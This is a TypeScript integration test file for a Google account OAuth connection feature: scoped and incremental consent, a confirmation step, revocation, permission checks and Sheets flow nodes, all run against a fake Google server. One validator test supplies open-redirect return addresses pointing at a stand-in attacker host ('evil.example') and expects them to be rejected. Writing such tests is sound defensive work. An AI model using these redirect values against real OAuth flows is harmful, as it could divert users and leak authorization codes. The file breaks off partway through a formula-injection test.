import request from 'supertest';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { RbacService } from '../../../src/kernel/rbac/rbac.service';
import { simInbound } from '../chat-conversations/pipeline-support';
import { FakeGoogle, type FakeAccount } from '../appointments-booking/fake-google';
import { bearer } from '../contacts-attributes-tags/support';
import {
  addFlow,
  edge,
  graph,
  node,
  openChannel,
  startFlowPipeline,
  untilRun,
  untilSent,
  type FlowPipeline,
  type SimChannel,
  type Tenant,
} from '../flow-runtime-engine/support';

/**
 * The workspace's Google account (TW-GACC) and the flow nodes that use it, end to end: connect with chosen capabilities, add one later
 * (incremental consent), the grant Google refuses, disconnect, then Sheets, Docs, Forms and Meet nodes through the real flow engine
 * against a Google stand-in.
 *
 * Google is `FakeGoogle`, written from Google's documentation (it enforces scopes per API, answers 403 SERVICE_DISABLED, 429, 401 and 409
 * the way the docs describe). It proves our code against that description; it says nothing about what a live Google account answers.
 */
let p: FlowPipeline;
let fake: FakeGoogle;
const saved: Record<string, string | undefined> = {};
const CALLBACK = '/v2/public/appointments/calendar/google/callback';
const A = 'https://www.googleapis.com/auth';
const SHEETS_ID = 'sheet-leads-0001';
const TEMPLATE_ID = 'doc-template-0001';
const FORM_ID = 'form-onboarding-0001';

beforeAll(async () => {
  fake = await FakeGoogle.start();
  const env = {
    ...fake.env(),
    GOOGLE_CALENDAR_CLIENT_ID: fake.clientId,
    GOOGLE_CALENDAR_CLIENT_SECRET: fake.clientSecret,
    GOOGLE_RETRY_BASE_MS: '1',
    GOOGLE_RETRY_AFTER_CAP_SECONDS: '2',
  };
  for (const k of Object.keys(env)) saved[k] = process.env[k];
  Object.assign(process.env, env);
  p = await startFlowPipeline();
}, 300_000);

afterAll(async () => {
  for (const [k, v] of Object.entries(saved)) {
    if (v === undefined) delete process.env[k];
    else process.env[k] = v;
  }
  await p?.stop();
  await fake?.stop();
});

// --- helpers ---------------------------------------------------------------------------------------------------------

let n = 0;
const http = () => request(p.h.app.getHttpServer());
const as = (t: Tenant | { token: string }) => ('admin' in t ? t.admin : t.token);
const get = (t: Tenant | { token: string }, path: string) =>
  http()
    .get(path)
    .set(bearer(as(t)));
const post = (t: Tenant | { token: string }, path: string, body: object = {}) =>
  http()
    .post(path)
    .set(bearer(as(t)))
    .send(body);

const rowOf = async (orgId: number) =>
  (
    await p.h.owner.query(`SELECT * FROM appointment_calendar_connections WHERE org_id = $1`, [
      orgId,
    ])
  ).rows[0] as Record<string, unknown> | undefined;

/**
 * Google's redirect has landed: when it points at the confirmation page, the same signed-in person confirms (or cancels) there, and the
 * page returns to `returnTo?calendar=<outcome>`. Anything else (denied, failed, expired ...) is already the final address.
 */
async function finish(
  token: Tenant | { token: string },
  location: string,
  how: 'confirm' | 'cancel' = 'confirm',
): Promise<string> {
  const m = /\/google-account\/confirm\?request=([0-9a-f-]{36})$/.exec(location);
  if (!m) return location;
  const seen = await get(token, `/v2/google-account/consent/${m[1]}`);
  expect(seen.status, JSON.stringify(seen.body)).toBe(200);
  const done = await post(token, `/v2/google-account/consent/${m[1]}/${how}`);
  expect(done.status, JSON.stringify(done.body)).toBe(200);
  return `http://localhost:3001${done.body.returnTo}?calendar=${done.body.outcome}`;
}

/** The admin ticks `capabilities` on the Google account page and completes Google's consent and the confirmation. Returns where the browser lands. */
async function connect(
  t: Tenant,
  capabilities: string[],
  opts: { email?: string; untick?: string[]; refresh?: boolean } = {},
): Promise<{ landing: string; authUrl: string }> {
  const start = await post(t, '/v2/google-account/connect', {
    capabilities,
    returnTo: '/google-account',
  });
  expect(start.status, JSON.stringify(start.body)).toBe(200);
  const authUrl = start.body.url as string;
  const state = new URL(authUrl).searchParams.get('state')!;
  const acct: FakeAccount = fake.account(opts.email ?? `owner${t.orgId}@example.com`);
  const code = fake.consent(`code-${++n}`, acct, authUrl, opts);
  const res = await http().get(CALLBACK).query({ code, state }).redirects(0);
  expect(res.status).toBe(302);
  return { landing: await finish(t, res.headers.location as string), authUrl };
}

const account = async (t: Tenant) => {
  const res = await get(t, '/v2/google-account');
  expect(res.status, JSON.stringify(res.body)).toBe(200);
  return res.body as {
    status: string;
    account: string | null;
    capabilities: Array<{ key: string; granted: boolean; restricted: boolean }>;
    lastError: { code: string } | null;
    lastUsedAt: string | null;
    calendarId: string | null;
  };
};
const granted = (a: Awaited<ReturnType<typeof account>>) =>
  a.capabilities.filter((c) => c.granted).map((c) => c.key);

// --- the page's API --------------------------------------------------------------------------------------------------

describe('the Google account page API', () => {
  it('starts disconnected, lists every capability with its restricted flag, and never shows a token', async () => {
    const t = await p.api.signup('gacc-new');
    const a = await account(t);
    expect(a).toMatchObject({ status: 'disconnected', account: null, lastError: null });
    expect(a.capabilities.map((c) => c.key)).toEqual([
      'calendar',
      'sheets',
      'docs',
      'forms',
      'drive_listing',
    ]);
    expect(a.capabilities.every((c) => !c.granted)).toBe(true);
    expect(Object.fromEntries(a.capabilities.map((c) => [c.key, c.restricted]))).toEqual({
      calendar: false,
      sheets: false,
      docs: true,
      forms: false,
      drive_listing: true,
    });
    expect(JSON.stringify(a)).not.toMatch(/token|secret/i);
  });

  it('asks Google only for the ticked capabilities, offline, with a signed state', async () => {
    const t = await p.api.signup('gacc-url');
    const start = await post(t, '/v2/google-account/connect', { capabilities: ['sheets'] });
    const url = new URL(start.body.url as string);
    expect(url.searchParams.get('scope')).toBe(`openid email ${A}/spreadsheets`);
    expect(url.searchParams.get('access_type')).toBe('offline');
    expect(url.searchParams.get('prompt')).toBe('consent');
    expect(url.searchParams.get('include_granted_scopes')).toBe('true');
    expect(url.searchParams.get('login_hint')).toBeNull();
    expect(url.searchParams.get('state')).toMatch(/\./);
    expect(start.body.expiresInSeconds).toBe(600);
  });

  it('refuses an empty or unknown capability list and a return address outside the app', async () => {
    const t = await p.api.signup('gacc-bad');
    for (const body of [
      { capabilities: [] },
      { capabilities: ['gmail'] },
      { capabilities: ['sheets'], returnTo: 'https://evil.example/x' },
      { capabilities: ['sheets'], returnTo: '//evil.example' },
    ]) {
      const res = await post(t, '/v2/google-account/connect', body);
      expect(res.status, JSON.stringify(body)).toBe(422);
    }
  });

  it('stores the grant sealed, shows the account and what it covers, and audits the connection', async () => {
    const t = await p.api.signup('gacc-conn');
    const { landing } = await connect(t, ['sheets']);
    expect(landing).toMatch(/\/google-account\?calendar=connected$/);
    const a = await account(t);
    expect(a.status).toBe('connected');
    expect(a.account).toBe(`owner${t.orgId}@example.com`);
    expect(granted(a)).toEqual(['sheets']);

    const row = (await rowOf(t.orgId))!;
    for (const col of ['refresh_token_enc', 'access_token_enc']) {
      expect(String(row[col])).not.toMatch(/^(rt|at)-/);
      expect(String(row[col]).length).toBeGreaterThan(30);
    }
    expect(String(row.scopes)).toContain(`${A}/spreadsheets`);
    const audit = await p.h.owner.query(
      `SELECT delta FROM audit_log WHERE org_id = $1 AND module = 'appointment_calendar' AND action = 'insert'`,
      [t.orgId],
    );
    expect(audit.rows[0].delta).toMatchObject({
      status: { new: 'connected' },
      capabilities: { old: null, new: 'sheets' },
    });
  });

  it('adds a permission later without losing the first ones (incremental consent)', async () => {
    const t = await p.api.signup('gacc-inc');
    await connect(t, ['sheets']);
    const before = await rowOf(t.orgId);
    const { authUrl } = await connect(t, ['forms']);
    expect(new URL(authUrl).searchParams.get('login_hint')).toBe(`owner${t.orgId}@example.com`);
    expect(new URL(authUrl).searchParams.get('scope')).toBe(
      `openid email ${A}/forms.body.readonly`,
    );
    const a = await account(t);
    expect(granted(a)).toEqual(['sheets', 'forms']);
    const after = await rowOf(t.orgId);
    expect(after!.refresh_token_enc).not.toBe(before!.refresh_token_enc);
    expect(
      await p.api.auditCount(t.orgId, 'appointment_calendar', 'update'),
    ).toBeGreaterThanOrEqual(1);
  });

  it('keeps a working connection when the person unticks the permission they were adding', async () => {
    const t = await p.api.signup('gacc-untick');
    await connect(t, ['sheets']);
    const { landing } = await connect(t, ['forms'], { untick: [`${A}/forms.body.readonly`] });
    expect(landing).toMatch(/calendar=missing_scope$/);
    const a = await account(t);
    expect(a.status).toBe('connected');
    expect(granted(a)).toEqual(['sheets']);
  });

  it('stores nothing and withdraws the grant when a first consent comes back short', async () => {
    const t = await p.api.signup('gacc-short');
    const before = fake.revoked.length;
    const { landing } = await connect(t, ['calendar'], { untick: [`${A}/calendar.freebusy`] });
    expect(landing).toMatch(/calendar=missing_scope$/);
    expect(await rowOf(t.orgId)).toBeUndefined();
    expect(fake.revoked.length).toBeGreaterThan(before);
  });

  it('is invisible to another workspace', async () => {
    const a = await p.api.signup('gacc-iso-a');
    const b = await p.api.signup('gacc-iso-b');
    await connect(a, ['sheets', 'forms']);
    expect(await account(b)).toMatchObject({ status: 'disconnected', account: null });
    const pick = await get(b, '/v2/flows/builder-context/google/status');
    expect(pick.body).toEqual({ status: 'disconnected', granted: [] });
  });

  it('needs the Google account permissions: read to look, manage to connect and disconnect', async () => {
    const t = await p.api.signup('gacc-rbac');
    const nobody = await p.api.member(t, 'nobody', [['record.contacts.read']]);
    const reader = await p.api.member(t, 'reader', [['google.account.read']]);
    expect((await get(nobody, '/v2/google-account')).status).toBe(403);
    expect((await get(reader, '/v2/google-account')).status).toBe(200);
    expect(
      (await post(reader, '/v2/google-account/connect', { capabilities: ['sheets'] })).status,
    ).toBe(403);
    expect((await post(reader, '/v2/google-account/disconnect')).status).toBe(403);
    expect((await get(reader, '/v2/google-account/calendars')).status).not.toBe(403);
  });

  it('says so, with a stable code, when the platform has no Google client', async () => {
    const t = await p.api.signup('gacc-noclient');
    const id = process.env.GOOGLE_CALENDAR_CLIENT_ID;
    delete process.env.GOOGLE_CALENDAR_CLIENT_ID;
    try {
      expect((await account(t)).status).toBe('unavailable');
      const res = await post(t, '/v2/google-account/connect', { capabilities: ['sheets'] });
      expect(res.status).toBe(422);
      expect(res.body.code).toBe('GOOGLE_ACCOUNT_NOT_CONFIGURED');
    } finally {
      process.env.GOOGLE_CALENDAR_CLIENT_ID = id;
    }
  });

  it('disconnects: revokes at Google, deletes the tokens, and is safe to repeat', async () => {
    const t = await p.api.signup('gacc-off');
    await connect(t, ['sheets']);
    const before = fake.revoked.length;
    const off = await post(t, '/v2/google-account/disconnect');
    expect(off.status).toBe(200);
    expect(off.body.status).toBe('disconnected');
    expect(fake.revoked.length).toBe(before + 1);
    expect(await rowOf(t.orgId)).toBeUndefined();
    expect((await post(t, '/v2/google-account/disconnect')).body.status).toBe('disconnected');
  });

  it('lists the calendars of an account that granted the calendar permission, and refuses without it', async () => {
    const t = await p.api.signup('gacc-cal');
    await connect(t, ['sheets']);
    const without = await get(t, '/v2/google-account/calendars');
    expect(without.status).toBe(409);
    await connect(t, ['calendar']);
    const withCal = await get(t, '/v2/google-account/calendars');
    expect(withCal.status, JSON.stringify(withCal.body)).toBe(200);
    expect(withCal.body.data[0]).toMatchObject({ primary: true });
  });

  it('the appointments calendar sees a Sheets-only account as not connected, and gains the calendar when it is added', async () => {
    const t = await p.api.signup('gacc-apptcal');
    await connect(t, ['sheets']);
    const cal = await get(t, '/v2/appointments/calendar');
    expect(cal.body).toMatchObject({ status: 'disconnected', connected: false });
    expect(cal.body.account).toBe(`owner${t.orgId}@example.com`);
    await connect(t, ['calendar']);
    expect((await get(t, '/v2/appointments/calendar')).body).toMatchObject({
      status: 'connected',
      connected: true,
    });
    expect(granted(await account(t))).toEqual(['calendar', 'sheets']);
  });
});

describe('the grant is shared, so replacing or ending it is guarded', () => {
  it('a booking editor may connect and end a calendar-only grant, but not one that Sheets or Docs also use', async () => {
    const t = await p.api.signup('gacc-share');
    const editor = await p.api.member(t, 'editor', [
      ['record.booking-types.update'],
      ['record.appointments.read'],
    ]);
    await connect(t, ['calendar']);
    const calOnly = await post(editor, '/v2/appointments/calendar/google/disconnect');
    expect(calOnly.status, JSON.stringify(calOnly.body)).toBe(200);
    expect(await rowOf(t.orgId)).toBeUndefined();

    await connect(t, ['calendar', 'sheets']);
    const off = await post(editor, '/v2/appointments/calendar/google/disconnect');
    expect(off.status).toBe(403);
    const start = await post(editor, '/v2/appointments/calendar/google/start', {});
    expect(start.status).toBe(403);
    expect(await rowOf(t.orgId)).toBeDefined();
    expect((await post(t, '/v2/google-account/disconnect')).body.status).toBe('disconnected');
  });

  it('reconnecting from the calendar card asks Google for what the account held, not for the calendar alone', async () => {
    const t = await p.api.signup('gacc-recon');
    await connect(t, ['calendar', 'sheets']);
    await p.h.owner.query(
      `UPDATE appointment_calendar_connections SET status = 'needs_reconnect' WHERE org_id = $1`,
      [t.orgId],
    );
    const start = await post(t, '/v2/appointments/calendar/google/start', {});
    expect(start.status, JSON.stringify(start.body)).toBe(200);
    const scope = new URL(start.body.url as string).searchParams.get('scope')!;
    expect(scope).toContain(`${A}/calendar.events`);
    expect(scope).toContain(`${A}/spreadsheets`);
  });

  it("another Google account replaces the old one and the old account's grant is withdrawn at Google", async () => {
    const t = await p.api.signup('gacc-switch');
    await connect(t, ['sheets'], { email: `first${t.orgId}@example.com` });
    const first = (await rowOf(t.orgId))!;
    const refreshBefore = [...fake.refreshTokens.entries()].filter(
      ([, v]) => v.account.email === `first${t.orgId}@example.com`,
    );
    expect(refreshBefore.length).toBeGreaterThan(0);

    await connect(t, ['sheets'], { email: `second${t.orgId}@example.com` });
    const now = (await rowOf(t.orgId))!;
    expect(now.account_email).toBe(`second${t.orgId}@example.com`);
    expect(now.account_sub).not.toBe(first.account_sub);
    // The first account's refresh token no longer works at Google.
    expect(refreshBefore.every(([, v]) => !v.valid)).toBe(true);
  });

  it('keeps the stored account untouched when Google cannot say who just consented', async () => {
    const t = await p.api.signup('gacc-who');
    await connect(t, ['sheets']);
    const before = (await rowOf(t.orgId))!;
    fake.failNext('GET', /userinfo$/, 500, { times: 10 });
    try {
      const { landing } = await connect(t, ['forms']);
      expect(landing).toMatch(/calendar=failed$/);
    } finally {
      fake.clearFailures();
    }
    const after = (await rowOf(t.orgId))!;
    expect(after.refresh_token_enc).toBe(before.refresh_token_enc);
    expect(after.account_sub).toBe(before.account_sub);
    expect(granted(await account(t))).toEqual(['sheets']);
  });
});

// --- the confirmation of a connection (TW-GACC-010) -------------------------------------------------------------------

/** Pressing Connect and getting Google's answer, but NOT confirming: returns the confirmation request's id. */
async function park(
  t: Tenant,
  capabilities: string[],
  opts: { email?: string; untick?: string[] } = {},
): Promise<string> {
  const start = await post(t, '/v2/google-account/connect', { capabilities });
  expect(start.status, JSON.stringify(start.body)).toBe(200);
  const authUrl = start.body.url as string;
  const state = new URL(authUrl).searchParams.get('state')!;
  const acct = fake.account(opts.email ?? `owner${t.orgId}@example.com`);
  const code = fake.consent(`code-${++n}`, acct, authUrl, opts);
  const res = await http().get(CALLBACK).query({ code, state }).redirects(0);
  const m = /\/google-account\/confirm\?request=([0-9a-f-]{36})$/.exec(res.headers.location ?? '');
  expect(m, res.headers.location).not.toBeNull();
  return m![1]!;
}
const requestRow = async (id: string) =>
  (await p.h.owner.query(`SELECT * FROM google_consent_requests WHERE uuid = $1`, [id])).rows[0] as
    Record<string, unknown> | undefined;

describe('a connection is stored only after the same signed-in person confirms', () => {
  it('shows who and what before storing anything: Google email, workspace, permissions', async () => {
    const t = await p.api.signup('gacc-cf-show');
    const id = await park(t, ['sheets', 'forms']);
    expect(await rowOf(t.orgId)).toBeUndefined(); // nothing stored yet
    const seen = await get(t, `/v2/google-account/consent/${id}`);
    expect(seen.status, JSON.stringify(seen.body)).toBe(200);
    expect(seen.body).toMatchObject({
      googleEmail: `owner${t.orgId}@example.com`,
      requested: ['sheets', 'forms'],
      granted: ['sheets', 'forms'],
      missing: [],
      replacesAccount: null,
    });
    expect(typeof seen.body.workspaceName).toBe('string');
    expect(JSON.stringify(seen.body)).not.toMatch(/token|secret|v1:/i);
    // The parked tokens are sealed too.
    const row = (await requestRow(id))!;
    expect(String(row.refresh_token_enc)).toMatch(/^v1:/);
    expect(JSON.stringify(row)).not.toMatch(/rt-code|at-\d/);

    const done = await post(t, `/v2/google-account/consent/${id}/confirm`);
    expect(done.status, JSON.stringify(done.body)).toBe(200);
    expect(done.body.outcome).toBe('connected');
    expect(granted(await account(t))).toEqual(['sheets', 'forms']);
    expect((await requestRow(id))!.status).toBe('confirmed');
    // The tokens are gone from the request once it is used.
    expect((await requestRow(id))!.refresh_token_enc).toBeNull();
  });

  it('a forwarded link used by someone else fails with a clear message, stores nothing and withdraws the grant', async () => {
    const t = await p.api.signup('gacc-cf-fwd');
    const other = await p.api.member(t, 'other', [['google.account.manage']]);
    const revoked = fake.revoked.length;
    const id = await park(t, ['sheets'], { email: `friend${t.orgId}@example.com` });

    const peek = await get(other, `/v2/google-account/consent/${id}`);
    expect(peek.status).toBe(403);
    expect(peek.body.code).toBe('GOOGLE_CONSENT_NOT_YOURS');
    expect(peek.body.detail).toMatch(/started by someone else/i);
    expect(await rowOf(t.orgId)).toBeUndefined();
    expect(fake.revoked.length).toBe(revoked + 1);
    expect((await requestRow(id))!.status).toBe('rejected');

    // The person who started it now finds the link dead, too: nothing to confirm.
    const late = await post(t, `/v2/google-account/consent/${id}/confirm`);
    expect(late.status).toBe(409);
    expect(late.body.code).toBe('GOOGLE_CONSENT_USED');
    expect(await rowOf(t.orgId)).toBeUndefined();

    // Confirming as the other person is refused as well.
    const id2 = await park(t, ['sheets']);
    const confirm = await post(other, `/v2/google-account/consent/${id2}/confirm`);
    expect(confirm.status).toBe(403);
    expect(confirm.body.code).toBe('GOOGLE_CONSENT_NOT_YOURS');
    expect(await rowOf(t.orgId)).toBeUndefined();
  });

  it('an expired confirmation is refused and nothing is stored', async () => {
    const t = await p.api.signup('gacc-cf-exp');
    const id = await park(t, ['sheets']);
    await p.h.owner.query(
      `UPDATE google_consent_requests SET expires_at = now() - interval '1 minute' WHERE uuid = $1`,
      [id],
    );
    const res = await post(t, `/v2/google-account/consent/${id}/confirm`);
    expect(res.status).toBe(410);
    expect(res.body.code).toBe('GOOGLE_CONSENT_EXPIRED');
    expect(await rowOf(t.orgId)).toBeUndefined();
    expect((await requestRow(id))!.status).toBe('expired');
  });

  it('a link that is replayed (confirmed twice, or twice at once) stores one grant and answers used', async () => {
    const t = await p.api.signup('gacc-cf-replay');
    const id = await park(t, ['sheets']);
    const both = await Promise.all([
      post(t, `/v2/google-account/consent/${id}/confirm`),
      post(t, `/v2/google-account/consent/${id}/confirm`),
    ]);
    expect(both.map((r) => r.status).sort()).toEqual([200, 409]);
    expect(both.find((r) => r.status === 409)!.body.code).toBe('GOOGLE_CONSENT_USED');
    const again = await post(t, `/v2/google-account/consent/${id}/confirm`);
    expect(again.status).toBe(409);
    expect(await p.api.auditCount(t.orgId, 'appointment_calendar', 'insert')).toBe(1);
  });

  it('a Google redirect replayed with the same state exchanges nothing the second time', async () => {
    const t = await p.api.signup('gacc-cf-redirect');
    const start = await post(t, '/v2/google-account/connect', { capabilities: ['sheets'] });
    const authUrl = start.body.url as string;
    const state = new URL(authUrl).searchParams.get('state')!;
    const code = fake.consent(`code-${++n}`, fake.account(`owner${t.orgId}@example.com`), authUrl);
    const first = await http().get(CALLBACK).query({ code, state }).redirects(0);
    expect(first.headers.location).toMatch(/\/google-account\/confirm\?request=/);
    const exchanges = fake.forms('authorization_code').length;
    const second = await http().get(CALLBACK).query({ code, state }).redirects(0);
    expect(second.headers.location).toMatch(/calendar=failed$/);
    expect(fake.forms('authorization_code').length).toBe(exchanges);
  });

  it("another workspace's admin cannot see or confirm it", async () => {
    const a = await p.api.signup('gacc-cf-wa');
    const b = await p.api.signup('gacc-cf-wb');
    const id = await park(a, ['sheets']);
    for (const res of [
      await get(b, `/v2/google-account/consent/${id}`),
      await post(b, `/v2/google-account/consent/${id}/confirm`),
      await post(b, `/v2/google-account/consent/${id}/cancel`),
    ]) {
      expect(res.status).toBe(404);
      expect(res.body.code).toBe('GOOGLE_CONSENT_NOT_FOUND');
    }
    expect(await rowOf(a.orgId)).toBeUndefined();
    expect(await rowOf(b.orgId)).toBeUndefined();
    // And it is still good for its owner.
    expect((await post(a, `/v2/google-account/consent/${id}/confirm`)).status).toBe(200);
  });

  it('cancelling stores nothing, withdraws the grant, and the link is dead afterwards', async () => {
    const t = await p.api.signup('gacc-cf-cancel');
    const revoked = fake.revoked.length;
    const id = await park(t, ['sheets']);
    const res = await post(t, `/v2/google-account/consent/${id}/cancel`);
    expect(res.status, JSON.stringify(res.body)).toBe(200);
    expect(res.body.outcome).toBe('cancelled');
    expect(await rowOf(t.orgId)).toBeUndefined();
    expect(fake.revoked.length).toBe(revoked + 1);
    expect((await requestRow(id))!.status).toBe('cancelled');
    expect((await requestRow(id))!.refresh_token_enc).toBeNull();
    const confirm = await post(t, `/v2/google-account/consent/${id}/confirm`);
    expect(confirm.status).toBe(409);
    expect(confirm.body.code).toBe('GOOGLE_CONSENT_USED');
  });

  it('cancelling a top-up keeps the working connection and does not withdraw its grant', async () => {
    const t = await p.api.signup('gacc-cf-keep');
    await connect(t, ['sheets']);
    const before = (await rowOf(t.orgId))!;
    const revoked = fake.revoked.length;
    const id = await park(t, ['forms']);
    expect((await post(t, `/v2/google-account/consent/${id}/cancel`)).status).toBe(200);
    expect(fake.revoked.length).toBe(revoked); // same Google account: its working grant is not revoked
    const after = (await rowOf(t.orgId))!;
    expect(after.refresh_token_enc).toBe(before.refresh_token_enc);
    expect(granted(await account(t))).toEqual(['sheets']);
  });

  it('says which account it would replace', async () => {
    const t = await p.api.signup('gacc-cf-replace');
    await connect(t, ['sheets'], { email: `old${t.orgId}@example.com` });
    const id = await park(t, ['sheets'], { email: `new${t.orgId}@example.com` });
    const seen = await get(t, `/v2/google-account/consent/${id}`);
    expect(seen.body.replacesAccount).toBe(`old${t.orgId}@example.com`);
    expect((await rowOf(t.orgId))!.account_email).toBe(`old${t.orgId}@example.com`);
  });

  it('confirming re-checks the permission against the grant AS IT IS NOW: a booking editor cannot replace a grant that Sheets started to share meanwhile', async () => {
    const t = await p.api.signup('gacc-cf-shared');
    const editor = await p.api.member(t, 'editor', [
      ['record.booking-types.update'],
      ['record.appointments.read'],
    ]);
    // The editor presses Connect on the calendar card while nothing is connected (allowed), and Google answers.
    const start = await post(editor, '/v2/appointments/calendar/google/start', {});
    expect(start.status, JSON.stringify(start.body)).toBe(200);
    const authUrl = start.body.url as string;
    const state = new URL(authUrl).searchParams.get('state')!;
    const code = fake.consent(`code-${++n}`, fake.account(`ed${t.orgId}@example.com`), authUrl);
    const res = await http().get(CALLBACK).query({ code, state }).redirects(0);
    const id = /request=([0-9a-f-]{36})$/.exec(res.headers.location ?? '')![1]!;

    // Meanwhile the workspace admin connects Sheets: the grant is now shared by Sheets and the calendar.
    await connect(t, ['sheets', 'calendar']);
    const before = (await rowOf(t.orgId))!;
    const revoked = fake.revoked.length;

    const confirm = await post(editor, `/v2/google-account/consent/${id}/confirm`);
    expect(confirm.status, JSON.stringify(confirm.body)).toBe(403);
    expect(confirm.body.code).toBe('FORBIDDEN');
    expect((await rowOf(t.orgId))!.refresh_token_enc).toBe(before.refresh_token_enc);
    expect(granted(await account(t))).toEqual(['calendar', 'sheets']);
    // The parked grant is withdrawn and forgotten, and the link is dead.
    expect(fake.revoked.length).toBe(revoked + 1);
    const row = (await requestRow(id))!;
    expect(row.status).toBe('rejected');
    expect(row.refresh_token_enc).toBeNull();
    expect((await post(editor, `/v2/google-account/consent/${id}/confirm`)).status).toBe(409);
  });

  it('a person who lost the permission after pressing Connect cannot confirm: nothing stored, grant withdrawn', async () => {
    const t = await p.api.signup('gacc-cf-lost');
    const mgr = await p.api.member(t, 'mgr', [['google.account.manage'], ['google.account.read']]);
    const id = await park(mgr as never, ['sheets']);
    await p.h.owner.query(
      `DELETE FROM role_grants WHERE org_id = $1 AND role_id IN (SELECT role_id FROM user_roles WHERE org_id = $1 AND user_id = $2)`,
      [t.orgId, mgr.userId],
    );
    // A role change bumps the workspace's roles version (the cache of every member's permissions): the same here.
    await p.h.app.get(RbacService).bumpRolesVersion(t.orgId);
    const revoked = fake.revoked.length;
    const confirm = await post(mgr, `/v2/google-account/consent/${id}/confirm`);
    expect(confirm.status, JSON.stringify(confirm.body)).toBe(403);
    expect(await rowOf(t.orgId)).toBeUndefined();
    expect(fake.revoked.length).toBe(revoked + 1);
    expect((await requestRow(id))!.status).toBe('rejected');
  });

  it('two workers (or a worker and the person) ending one confirmation withdraw its grant exactly once', async () => {
    const t = await p.api.signup('gacc-cf-once');
    const id = await park(t, ['sheets']);
    await p.h.owner.query(
      `UPDATE google_consent_requests SET expires_at = now() - interval '1 minute' WHERE uuid = $1`,
      [id],
    );
    const revoked = fake.revoked.length;
    const { GoogleConsentService } = await import('../../../src/modules/appointments-booking');
    const svc = p.h.app.get(GoogleConsentService);
    const [a, b, c] = await Promise.all([
      svc.sweepExpired(),
      svc.sweepExpired(),
      svc.sweepExpired(),
    ]);
    expect(a + b + c).toBeGreaterThanOrEqual(1);
    expect(fake.revoked.length).toBe(revoked + 1);
    expect((await requestRow(id))!.status).toBe('expired');
  });

  it('the worker sweep forgets and withdraws confirmations nobody finished', async () => {
    const t = await p.api.signup('gacc-cf-sweep');
    const id = await park(t, ['sheets']);
    await p.h.owner.query(
      `UPDATE google_consent_requests SET expires_at = now() - interval '1 minute' WHERE uuid = $1`,
      [id],
    );
    const revoked = fake.revoked.length;
    const { GoogleConsentService } = await import('../../../src/modules/appointments-booking');
    expect(await p.h.app.get(GoogleConsentService).sweepExpired()).toBeGreaterThanOrEqual(1);
    expect((await requestRow(id))!.status).toBe('expired');
    expect((await requestRow(id))!.refresh_token_enc).toBeNull();
    expect(fake.revoked.length).toBe(revoked + 1);
  });
});

// --- the file pickers in the flow builder ----------------------------------------------------------------------------

describe('the flow builder pickers', () => {
  it('lists the account files of each kind when the file-list permission is granted', async () => {
    fake.files.set('s-old', {
      name: 'Old leads',
      mimeType: 'application/vnd.google-apps.spreadsheet',
      modified: 1,
    });
    fake.files.set('s-new', {
      name: 'New leads',
      mimeType: 'application/vnd.google-apps.spreadsheet',
      modified: 2,
    });
    fake.files.set('d-1', {
      name: 'Quote template',
      mimeType: 'application/vnd.google-apps.document',
      modified: 1,
    });
    const t = await p.api.signup('gacc-pick');
    await connect(t, ['sheets', 'drive_listing']);
    const sheets = await get(t, '/v2/flows/builder-context/google/sheets');
    expect(sheets.status, JSON.stringify(sheets.body)).toBe(200);
    expect(sheets.body.data.map((f: { id: string }) => f.id).slice(0, 2)).toEqual([
      's-new',
      's-old',
    ]);
    const docs = await get(t, '/v2/flows/builder-context/google/docs');
    expect(docs.body.data).toEqual(expect.arrayContaining([{ id: 'd-1', name: 'Quote template' }]));
    expect((await get(t, '/v2/flows/builder-context/google/status')).body).toEqual({
      status: 'connected',
      granted: ['sheets', 'drive_listing'],
    });
  });

  it('answers with the code that says what to do: not connected, or permission missing', async () => {
    const t = await p.api.signup('gacc-pick2');
    const none = await get(t, '/v2/flows/builder-context/google/sheets');
    expect(none.status).toBe(409);
    expect(none.body.code).toBe('GOOGLE_ACCOUNT_NOT_CONNECTED');
    await connect(t, ['sheets']);
    const noList = await get(t, '/v2/flows/builder-context/google/sheets');
    expect(noList.status).toBe(409);
    expect(noList.body.code).toBe('GOOGLE_SCOPE_MISSING');
  });
});

// --- the flow nodes --------------------------------------------------------------------------------------------------

let peerN = 0;
const nextPeer = () => `9198${String(20000000 + peerN++).padStart(8, '0')}`;

interface Arranged {
  t: Tenant;
  ch: SimChannel;
  flowId: number;
}

async function arrange(
  label: string,
  nodes: unknown[],
  edges: unknown[],
  keyword: string,
  existing?: Tenant,
): Promise<Arranged> {
  const t = existing ?? (await p.api.signup(label));
  const ch = await openChannel(p, t);
  const f = await addFlow(p, t, {
    graph: graph(
      [node('t', 'trigger', {}, { isStart: true }), ...nodes],
      [edge('t', (nodes[0] as { id: string }).id), ...edges],
    ),
    trigger: { kind: 'keyword', keywords: keyword },
  });
  return { t, ch, flowId: f.id };
}

const say = (t: Tenant, ch: SimChannel, peer: string, text: string, name = 'Asha') =>
  simInbound(p as never, t, ch, { from: peer, name, text });

/** The run log of the last run, as one string: every step's notes live in its detail. */
async function logOf(a: Arranged): Promise<string> {
  const run = await untilRun(p, a.t, a.flowId, 'finished', (r) =>
    ['completed', 'failed', 'waiting'].includes(r.status),
  );
  const r = await p.h.owner.query(
    `SELECT detail::text AS d FROM flow_run_steps WHERE run_id = $1`,
    [run.id],
  );
  return r.rows.map((x) => String(x.d)).join('\n');
}

const seedSheet = () =>
  fake.addSheet(SHEETS_ID, {
    Leads: [
      ['Name', 'Phone', 'Plan'],
      ['Ana', '555', 'gold'],
      ['Bo', '777', 'free'],
    ],
    Other: [['x']],
  });

describe('Google Sheets nodes against the connected account', () => {
  it('append a row with the customer values, as the connected Google account', async () => {
    seedSheet();
    const a = await arrange(
      'gflow-w',
      [
        node('s', 'google_sheets', {
          sheetId: SHEETS_ID,
          tabName: 'Leads',
          columns: ['{{name}}', '{{trigger_text}}', 'x'],
        }),
        node('m', 'message', { text: 'done {{name}}' }),
      ],
      [edge('s', 'm')],
      'sheetw',
    );
    await connect(a.t, ['sheets']);
    const peer = nextPeer();
    await say(a.t, a.ch, peer, 'sheetw');
    expect(await untilSent(p, a.t, a.ch, peer, 1)).toEqual(['done Asha']);
    const rows = fake.sheets.get(SHEETS_ID)!.get('Leads')!;
    expect(rows[rows.length - 1]).toEqual(['Asha', '', 'x']);
    const append = fake.requests
      .filter((r) => r.method === 'POST' && /:append/.test(r.path))
      .pop()!;
    expect(append.auth).toMatch(/^at-/);
    expect((await account(a.t)).lastError).toBeNull();
  });

  it('stores a customer-typed formula as text, so it cannot run in the owner sheet', async () => {
    seedSheet();
    const a = await arrange(
      'gflow-inj',
      [
